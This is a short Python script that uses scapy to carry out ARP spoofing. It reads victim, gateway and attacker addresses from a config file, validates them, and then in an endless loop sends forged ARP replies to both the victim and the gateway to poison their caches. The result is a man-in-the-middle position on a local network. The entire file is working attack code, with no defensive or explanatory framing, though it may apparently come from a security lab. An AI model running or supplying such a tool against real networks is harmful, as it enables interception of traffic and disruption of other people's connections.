import sys
import validation

sys_path, victim_mac, victim_ip, gateway_mac, gateway_ip, interface, attacker_mac = validation.read_config('config.txt')

if validation.validate_sys_path(sys_path):
    sys.path.append(sys_path)
else:
    print("Invalid sys_path")
    sys.exit(1) 

from scapy.all import *
    
def arp_spoofing(victim_mac, victim_ip, gateway_mac, gateway_ip):
    """
    Perform ARP spoofing between victim and gateway.

    Args:
        victim_mac (str): Victim's MAC address.
        victim_ip (str): Victim's IP address.
        gateway_mac (str): Gateway's MAC address.
        gateway_ip (str): Gateway's IP address.
    """
    while True:
        sendp(Ether(dst=victim_mac)/ARP(op=2, psrc=gateway_ip, pdst=victim_ip))
        sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=victim_ip, pdst=gateway_ip))
        
def main():
    """
    Main function to perform ARP spoofing.
    """
    if (
        not validation.validate_mac(victim_mac) 
        or not validation.validate_ip(victim_ip) 
        or not validation.validate_mac(gateway_mac) 
        or not validation.validate_ip(gateway_ip) 
        or not validation.validate_mac(attacker_mac)
    ):
        print("Invalid parameters in config file")
        return
    
    try:
        arp_spoofing(victim_mac, victim_ip, gateway_mac, gateway_ip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        
if __name__ == "__main__":
    main()
    
